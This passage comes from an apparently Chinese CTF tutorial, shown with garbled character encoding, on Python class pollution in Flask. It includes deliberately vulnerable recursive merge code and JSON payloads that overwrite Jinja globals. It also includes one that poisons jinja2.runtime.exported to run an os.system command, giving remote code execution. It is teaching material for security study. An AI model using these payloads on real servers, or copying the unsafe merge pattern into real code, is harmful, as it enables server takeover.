</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">#app.py</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span><span class="n">request</span><span class="p">,</span><span class="n">render_template</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">merge</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="n">dst</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Recursive merge function</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">src</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="s1">&#39;__getitem__&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">dst</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">v</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">setattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">cls</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">instance</span> <span class="o">=</span> <span class="bp">cls</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span> <span class="s1">&#39;GET&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">merge</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">data</span><span class="p">),</span> <span class="n">instance</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;index.html&#34;</span><span class="p">,</span> <span class="n">flag</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;flag&#34;</span><span class="p">,</span> <span class="s2">&#34;rt&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s2">&#34;0.0.0.0&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Áõ¥Êé•ËÆøÈóÆ‰ºöÁî±‰∫éÊ≤°ÊúâËÆæÂÆö<code>permission</code>ÂÄºÂØºËá¥<code>if</code>Êù°‰ª∂‰∏∫ÂÅáËøîÂõû<code>No way!</code>ËÄå‰∏çÊòØ<code>flag</code></p>
<p>ÊâÄ‰ª•Â∞ÜÂÖ∂ËµãÂÄº‰∏∫‰ªªÊÑèÈÄªËæëÈùûÁ©∫ÂÄºËÆ©Êù°‰ª∂‰∏∫ÁúüÂç≥ÂèØ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{
</span></span><span class="line"><span class="cl">    &#34;__init__&#34; : {
</span></span><span class="line"><span class="cl">        &#34;__globals__&#34; : {
</span></span><span class="line"><span class="cl">            &#34;app&#34; : {
</span></span><span class="line"><span class="cl">                    &#34;jinja_env&#34; :{
</span></span><span class="line"><span class="cl">                      &#34;golbals&#34; :{
</span></span><span class="line"><span class="cl">                        &#34;permission&#34; :true
</span></span><span class="line"><span class="cl">                      }
</span></span><span class="line"><span class="cl">                }      
</span></span><span class="line"><span class="cl">            }
</span></span><span class="line"><span class="cl">        }
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">}    
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="Ê®°ÊùøÁºñËØëÊó∂ÁöÑÂèòÈáè">Ê®°ÊùøÁºñËØëÊó∂ÁöÑÂèòÈáè
</h3><p>Âú®<code>flask</code>‰∏≠Â¶Ç‰ΩøÁî®<code>render_template</code>Ê∏≤Êüì‰∏Ä‰∏™Ê®°ÊùøÂÆûÈôÖ‰∏äÁªèÂéÜ‰∫ÜÂ§ö‰∏™Èò∂ÊÆµÁöÑÂ§ÑÁêÜÔºåÂÖ∂‰∏≠‰∏Ä‰∏™Èò∂ÊÆµÊòØÂØπÊ®°Êùø‰∏≠ÁöÑ<code>Jinja</code>ËØ≠Ê≥ïËøõË°åËß£ÊûêËΩ¨Âåñ‰∏∫<code>AST</code>ÔºåËÄåÂú®ËØ≠Ê≥ïÊ†ëÁöÑÊ†πÈÉ®Âç≥<code>Lib/site-packages/jinja2/compiler.py</code>‰∏≠<code>CodeGenerator</code>Á±ªÁöÑ<code>visit_Template</code>ÊñπÊ≥ïÂ≠òÂú®‰∏ÄÊÆµÊúâË∂£ÁöÑÈÄªËæë</p>
<p>ËØ•ÈÄªËæë‰ºöÂêëËæìÂá∫ÊµÅÂÜôÂÖ•‰∏ÄÊÆµÊãºÊé•ÁöÑ‰ª£Á†ÅÔºàËæìÂá∫ÊµÅ‰∏≠‰ª£Á†ÅÊúÄÁªà‰ºöË¢´ÁºñËØëËøõËÄåÊâßË°åÔºâÔºåÊ≥®ÊÑèÂÖ∂‰∏≠ÁöÑ<code>exported_names</code>ÂèòÈáèÔºåËØ•ÂèòÈáè‰∏∫<code>.runtime</code>Ê®°ÂùóÔºàÂç≥<code>Lib/site-packages/jinja2/runtime.py</code>Ôºâ‰∏≠ÂØºÂÖ•ÁöÑÂèòÈáè<code>exported</code>Âíå<code>async_exported</code>ÁªÑÂêàÂêéÂæóÂà∞ÔºåËøôÂ∞±ÊÑèÂë≥ÁùÄÊàë‰ª¨ÂèØ‰ª•ÈÄöËøáÊ±°Êüì<code>.runtime</code>Ê®°Âùó‰∏≠Ëøô‰∏§‰∏™ÂèòÈáèÂÆûÁé∞RCE„ÄÇÁî±‰∫éËøôÊÆµÈÄªËæëÊòØÊ®°ÊùøÊñá‰ª∂Ëß£ÊûêËøáÁ®ã‰∏≠ÂøÖÁªèÁöÑÊ≠•È™§‰πã‰∏ÄÔºåÊâÄ‰ª•ËøôÂ∞±ÊÑèÂë≥ÁùÄÂè™Ë¶ÅÊ∏≤Êüì‰ªªÊÑèÁöÑÊñá‰ª∂ÂùáËÉΩÈÄöËøáÊ±°ÊüìËøô‰∏§Â±ûÊÄßÂÆûÁé∞RCE„ÄÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">#templates/index.html
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>nt here~<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>    
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">#app.py</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span><span class="n">request</span><span class="p">,</span><span class="n">render_template</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">merge</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="n">dst</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Recursive merge function</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">src</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="s1">&#39;__getitem__&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">dst</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">v</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">setattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">cls</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">instance</span> <span class="o">=</span> <span class="bp">cls</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span> <span class="s1">&#39;GET&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">merge</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">data</span><span class="p">),</span> <span class="n">instance</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;index.html&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s2">&#34;0.0.0.0&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#static/
</span></span><span class="line"><span class="cl">#ÊòØ‰∏™Á©∫ÁõÆÂΩï,Êñπ‰æøÁõ¥Êé•Âà©Áî®staticÁõÆÂΩïËØªÂèñflag
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøõË°å<code>RCE</code>Â∞Ü<code>flag</code>ÂÜôÂÖ•<code>static</code>ÁõÆÂΩï‰∏≠</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;__init__&#34;</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;__globals__&#34;</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;__loader__&#34;</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;__init__&#34;</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">                    <span class="s2">&#34;__globals__&#34;</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">                        <span class="s2">&#34;sys&#34;</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">                            <span class="s2">&#34;modules&#34;</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">                                <span class="s2">&#34;jinja2&#34;</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">                                    <span class="s2">&#34;runtime&#34;</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">                                        <span class="s2">&#34;exported&#34;</span><span class="p">:[</span>
</span></span><span class="line"><span class="cl">                                            <span class="s2">&#34;*;__import__(&#39;os&#39;).system(&#39;cp ./flag ./static/flag&#39;);#&#34;</span>
</span></span><span class="line"><span class="cl">                                        <span class="p">]</span>
</span></span><span class="line"><span class="cl">                                    <span class="p">}</span>
</span></span><span class="line"><span class="cl">                                <span class="p">}</span>
</span></span><span class="line"><span class="cl">                            <span class="p">}</span>
</span></span><span class="line"><span class="cl">                        <span class="p">}</span>
</span></span><span class="line"><span class="cl">                    <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>‰ΩÜÊòØÈúÄË¶ÅÊ≥®ÊÑèÊèíÂÖ•<code>payload</code>ÁöÑ‰ΩçÁΩÆÊòØASTÁöÑÊ†πÈÉ®ÂàÜÔºåÊòØ‰Ωú‰∏∫Ê®°ÊùøÁºñËØëÊó∂ÁöÑÂ§ÑÁêÜ‰ª£Á†ÅÁöÑ‰∏ÄÈÉ®ÂàÜÔºåÂêåÊ†∑ÂèóÂà∞Ê®°ÊùøÁºìÂ≠òÁöÑÂΩ±ÂìçÔºå‰πüÂ∞±ÊòØËØ¥ËøôÈáåÊèíÂÖ•ÁöÑ<code>payload</code>Âè™‰ºöÂú®Ê®°ÊùøÂú®Á¨¨‰∏ÄÊ¨°ËÆøÈóÆÊó∂Ëß¶Âèë</p>
<p>ÁÑ∂ÂêéÂ∞±ËÉΩÂú®<code>static</code>ÁõÆÂΩï‰∏ãËØªÂèñÂà∞<code>flag</code>‰∫Ü</p>
<h2 id="‰æãÈ¢ò">‰æãÈ¢ò
</h2><h3 id="dasctf-2023--0x401‰∏ÉÊúàÊöëÊúüÊåëÊàòËµõezflask">[DASCTF 2023 &amp; 0X401‰∏ÉÊúàÊöëÊúüÊåëÊàòËµõ]EzFlask
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">uuid</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">session</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">secret</span> <span class="kn">import</span> <span class="n">black_list</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">check</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">black_list</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">merge</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="n">dst</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">src</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="s1">&#39;__getitem__&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">dst</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">v</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">setattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">user</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">username</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">password</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">check</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">username</span> <span class="o">==</span> <span class="n">data</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="ow">and</span> <span class="bp">self</span><span class="o">.</span><span class="n">password</span> <span class="o">==</span> <span class="n">data</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Users</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/register&#39;</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
